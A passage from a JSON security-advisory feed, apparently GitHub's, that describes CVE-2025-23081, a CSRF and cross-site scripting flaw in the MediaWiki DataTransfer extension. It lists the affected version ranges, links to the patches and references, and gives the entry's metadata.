            "content_html": "<p>Cross-Site Request Forgery (CSRF), Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Wikimedia Foundation Mediawiki - DataTransfer Extension allows Cross Site Request Forgery, Cross-Site Scripting (XSS).This issue affects Mediawiki - DataTransfer Extension: from 1.39.X before 1.39.11, from 1.41.X before 1.41.3, from 1.42.X before 1.42.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23081\">https://nvd.nist.gov/vuln/detail/CVE-2025-23081</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0\">https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3\">https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7\">https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9\">https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9</a></li>\n<li><a href=\"https://phabricator.wikimedia.org/T379749\">https://phabricator.wikimedia.org/T379749</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3h5-h73c-29hq\">https://github.com/advisories/GHSA-c3h5-h73c-29hq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq",
            "title": "[mediawiki/data-transfer] Mediawiki - DataTransfer Extension Cross-Site Request Forgery (CSRF) and Cross-site Scripting (XSS)",
            "date_modified": "2025-01-14T20:07:52.000Z",
            "date_published": "2025-01-14T18:32:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}